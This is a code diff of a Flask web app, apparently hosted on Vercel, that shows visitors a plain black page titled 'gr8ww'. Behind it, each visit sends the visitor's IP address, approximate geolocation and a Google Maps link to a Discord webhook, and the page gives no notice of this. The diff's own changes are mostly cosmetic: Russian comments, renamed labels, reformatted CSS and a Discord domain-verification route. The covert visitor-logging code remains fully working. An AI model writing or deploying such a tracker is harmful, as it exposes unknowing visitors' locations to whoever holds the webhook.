@@ -8,12 +8,12 @@ from flask import Flask, request
 
 app = Flask(__name__)
 
-# Discord Webhook берётся из настроек Vercel
+# Вебхук Discord из настроек Vercel
 WEBHOOK_URL = os.environ.get("DISCORD_WEBHOOK")
 
 
+# Получение IP посетителя
 def get_visitor_ip():
-    # На Vercel запросы проходят через прокси
     forwarded = request.headers.get("X-Forwarded-For", "")
 
     ip = forwarded.split(",")[0].strip()
@@ -28,6 +28,7 @@ def get_visitor_ip():
         return "Unknown"
 
 
+# Приблизительная геолокация по IP
 def get_location(ip):
     try:
         address = ipaddress.ip_address(ip)
@@ -52,6 +53,7 @@ def get_location(ip):
     return {}
 
 
+# Отправка отчёта в Discord
 def send_to_discord(ip, data):
     if not WEBHOOK_URL:
         print("Discord webhook not configured")
@@ -70,8 +72,9 @@ def send_to_discord(ip, data):
 
     maps = "Unavailable"
 
-    if isinstance(latitude, (int, float)) and isinstance(
-        longitude, (int, float)
+    if (
+        isinstance(latitude, (int, float))
+        and isinstance(longitude, (int, float))
     ):
         maps = (
             "https://www.google.com/maps"
@@ -108,7 +111,7 @@ def send_to_discord(ip, data):
     )
 
     payload = {
-        "username": "gr8w",
+        "username": "gr8ww",
         "allowed_mentions": {"parse": []},
         "embeds": [
             {
@@ -125,6 +128,7 @@ def send_to_discord(ip, data):
             json=payload,
             timeout=3
         )
+
         response.raise_for_status()
         print("Discord notification sent")
 
@@ -132,6 +136,7 @@ def send_to_discord(ip, data):
         print("Discord error:", error)
 
 
+# Главная страница сайта
 @app.route("/")
 def home():
     ip = get_visitor_ip()
@@ -147,7 +152,7 @@ def home():
     <meta name="viewport"
           content="width=device-width, initial-scale=1">
 
-    <title>gr8w</title>
+    <title>gr8ww</title>
 
     <style>
         * {
@@ -158,7 +163,7 @@ def home():
             margin: 0;
             width: 100%;
             min-height: 100%;
-            background: #000;
+            background: #000000;
         }
 
         body {
@@ -166,14 +171,14 @@ def home():
             min-height: 100dvh;
 
             display: flex;
-            justify-content: center;
             align-items: center;
+            justify-content: center;
 
             overflow-x: auto;
         }
 
         pre {
-            color: #fff;
+            color: #ffffff;
             background: transparent;
 
             font-family: Consolas, "Courier New", monospace;
@@ -184,7 +189,6 @@ def home():
             white-space: pre;
             margin: 0;
             padding: 16px;
-
             text-align: left;
         }
     </style>
@@ -214,5 +218,15 @@ def home():
 """
 
 
+# Подтверждение владения сайтом для Discord
+@app.route("/.well-known/discord")
+def discord_verify():
+    return (
+        "dh=a82ad1feba4d0bdf3569765ddb00cd2b010b4d88",
+        200,
+        {"Content-Type": "text/plain"}
+    )
+
+
 if __name__ == "__main__":
-    app.run(debug=True)
+    app.run()
